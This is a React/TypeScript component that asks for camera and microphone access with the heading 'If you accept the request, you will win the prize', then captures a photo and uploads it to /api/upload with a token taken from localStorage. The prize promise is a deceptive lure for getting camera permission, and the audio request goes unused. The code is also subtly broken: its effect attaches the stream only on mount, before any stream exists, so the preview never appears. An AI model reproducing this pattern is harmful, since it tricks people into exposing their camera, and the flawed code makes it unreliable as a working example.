import { useState, useRef, useEffect } from "react";
import axios from "axios";

export default function CameraAccess() {
  const [hasPermission, setHasPermission] = useState<boolean | null>(null);
  const [uploadStatus, setUploadStatus] = useState<string | null>(null);
  const stream = useRef<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  useEffect(() => {
    if (videoRef.current && stream.current) {
      videoRef.current.srcObject = stream.current;
    }

    return () => {
      if (stream.current) {
        stream.current.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  const requestCameraAccess = async () => {
    try {
      const newStream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true,
      });
      stream.current = newStream;
      setHasPermission(true);
    } catch (error) {
      console.error("Lack of access to the camera:", error);
      setHasPermission(false);
    }
  };

  const capturePhoto = async () => {
    const canvas = canvasRef.current;
    const video = videoRef.current;

    if (!canvas || !video) return;

    const context = canvas.getContext("2d");
    if (!context) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
      if (!blob) return;

      const formData = new FormData();
      formData.append("image", blob, "captured-image.png");

      try {
        const token = localStorage.getItem("user");

        const response = await axios.post("/api/upload", formData, {
          headers: {
            Authorization: `Bearer ${token}`,
          },
          validateStatus: (status) => status < 500,
        });

        if (response.status >= 200 && response.status < 300) {
          setUploadStatus("Photo uploaded successfully!");
        } else {
          setUploadStatus(`خطا: ${response.data.message || "unknown error"}`);
        }
      } catch (error) {
        if (axios.isAxiosError(error)) {
          const errorMessage = error.response?.data?.message || error.message;
          setUploadStatus(`error: ${errorMessage}`);
        } else {
          setUploadStatus("An unexpected error occurred.");
        }
      }
    }, "image/png");
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4">
      <h1 className="text-2xl font-semibold mb-4">
        If you accept the request, you will win the prize
      </h1>

      {hasPermission === null ? (
        <button
          onClick={requestCameraAccess}
          className="px-4 py-2 bg-blue-600 text-white rounded-lg shadow-md"
        >
          Allow access to the camera
        </button>
      ) : hasPermission ? (
        <div className="flex flex-col items-center">
          <video
            ref={videoRef}
            autoPlay
            playsInline
            muted
            className="w-full max-w-md rounded-lg shadow-md"
          />
          <button
            onClick={capturePhoto}
            className="mt-4 px-4 py-2 bg-green-600 text-white rounded-lg shadow-md"
          >
            Taking pictures 📸
          </button>
          {uploadStatus && (
            <p className="mt-2 text-green-600">{uploadStatus}</p>
          )}
        </div>
      ) : (
        <p className="text-red-600">Access to the camera was not granted</p>
      )}

      <canvas ref={canvasRef} className="hidden"></canvas>
    </div>
  );
}
